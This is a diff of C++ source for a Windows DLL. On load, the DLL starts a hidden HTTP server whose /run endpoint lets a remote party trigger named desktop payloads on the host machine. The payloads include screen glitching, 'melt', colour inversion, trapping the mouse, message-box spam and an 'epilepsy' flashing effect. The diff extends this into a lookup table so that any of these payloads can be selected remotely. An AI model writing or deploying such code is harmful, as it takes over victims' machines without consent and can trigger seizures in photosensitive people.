@@ -1,8 +1,14 @@
 #include "httplib.h"
 #include <Windows.h>
+#include <map>
+#include <string>
 #include "payloads.h"
 
 #define EXPORT extern "C" __declspec(dllexport)
+
+#define THR(x) ((PTHREAD_START_ROUTINE) x)
+
+std:: map<std::string, void (*)()> funcMap;
 
 struct PayloadInfo {
 	std::string payload;
@@ -15,10 +21,13 @@ int WINAPI payloadThread(PayloadInfo* info) {
 	time_t start = time(0);
 	time_t now = 0;
 
-	while (start + info->durationSec > now) {
-		payload::msgboxmousefollow();
-		Sleep(info->delayMs);
-		time(&now);
+	if (funcMap[info->payload] != nullptr) {
+		GetCursorPos(&payload::mouse);
+		while (start + info->durationSec > now) {
+			funcMap[info->payload]();
+			Sleep(info->delayMs);
+			time(&now);
+		}
 	}
 
 	delete info;
@@ -32,6 +41,19 @@ int WINAPI thread(HMODULE hmodule) {
 	Server svr;
 	payload::init();
 
+	funcMap = {
+		{ "mouse", payload::moveMouse },
+		{ "glitch", payload::screenGlitch },
+		{ "tunnel", payload::screenTunnel },
+		{ "invert", payload::screenInvert },
+		{ "errorcursor", payload::drawErrorCursor },
+		{ "melt", payload::melt },
+		{ "epilepsy", payload::epilepsy },
+		{ "trapmouse", payload::trapMouse },
+		{ "msgboxmousefollow", payload::msgboxmousefollow },
+		{ "drawtext", payload::drawText },
+	};
+
 	svr.Get(R"(/run)", [](const Request& req, Response& res) {
 		if (req.has_param("payload") && req.has_param("duration") && req.has_param("delay")) {
 			PayloadInfo* info = new PayloadInfo();
@@ -40,7 +62,7 @@ int WINAPI thread(HMODULE hmodule) {
 			info->durationSec = atoi(req.get_param_value("duration").c_str());
 			info->delayMs = atoi(req.get_param_value("delay").c_str());
 
-			CreateThread(0, 0,(PTHREAD_START_ROUTINE) payloadThread, info, 0, 0);
+			CreateThread(0, 0, THR(payloadThread), info, 0, 0);
 
 			res.set_content("ok", "text/html");
 		}
@@ -65,6 +87,6 @@ int WINAPI thread(HMODULE hmodule) {
 int WINAPI DllMain(HMODULE hModule, DWORD reason, void*) {
 	DisableThreadLibraryCalls(hModule);
 	if (reason == 1)
-		CreateThread(0, 0, (PTHREAD_START_ROUTINE)thread, hModule, 0, 0);
+		CreateThread(0, 0, THR(thread), hModule, 0, 0);
 	return 1;
 }
